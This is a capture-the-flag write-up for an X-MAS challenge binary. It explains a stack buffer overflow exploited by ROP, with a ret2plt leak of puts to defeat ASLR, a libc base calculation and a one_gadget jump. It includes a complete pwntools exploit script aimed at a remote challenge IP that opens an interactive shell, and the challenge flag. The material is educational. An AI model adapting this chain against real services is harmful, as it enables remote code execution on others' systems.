## exploit

In this challenge we have to exploit ELF 64 bit not stripped that seems to let an attacker perform ROP attack:
```
This is easier than you would think...
Santa allowed you to ROP me!
ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
Segmentation fault (core dumped)
```
with checksec is quite clear that we can perform classic buffer overflow attack without consider canary:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
At this point ret2plt seems to be the most simple choice but the programs does not perform any system. The second problem is that NX bit is enabled so I could consider to execute my shellcode only if I could perform an mprotect call and let some section being executable, moreover I didn't know if the remote server has ASLR enable and must place shellcode into `.bss` section. In order to discover that I could print with ret2plt GOT entry for one function called by the program and yet resolved (for istance put) and try to discover that.

```
This is easier than you would think...
Santa allowed you to ROP me!
puts 0x7ff28b205460

This is easier than you would think...
Santa allowed you to ROP me!
puts 0x7fd40dcfb940
```
Unfortunatly ASLR is enabled so the right things to do after that is a chain that:
* leak GOT entry for libc function yet resolved
* discover libc version in order to obtain base address for the right libc version
* using one_gadget and looking for magic gadget offset right to the version of libc discovered

The other problem is that the program perform the gets one time and we waste that to leak GOT entry, so the things we could do is perform a ret2plt to puts function and discover the address resolved, after that jumping at the start of the program in order to perform another buffer overflow and jump to our magic gadget. 

The leak reveal that remote server make use of different libc version, after some attempts the exploit worked perfectly performing jump to right magic gadget for one the version chosen after see the last bytes of puts address:

```python
#!/usr/bin/env python3

from pwn import *

s=remote('199.247.6.180',10005)
print(s.recvuntil('\n'))
print(s.recvuntil('\n'))


s.send("a"*40+"\x7b\x07\x40\x00\x00\x00\x00\x00"+"\x18\x10\x60\x00\x00\x00\x00\x00"+"\x50\x05\x40\x00\x00\x00\x00\x00"+"\x76\x06\x40\x00\x00\x00\x00\x00"*2+"\n")

out=s.recv(6)+b"\x00\x00"
lputs=u64(out)
print("puts "+hex(lputs))
base_addr=lputs-0x06fd60
magic=base_addr+0xea36d
print(s.recvuntil('\n'))
print(s.recvuntil('\n'))
s.send(p64(magic)*8+b"\n")

s.interactive()
```
##### flag: X-MAS{r4nd0m_chr157m45_pr353n75_4r3_50_fun}



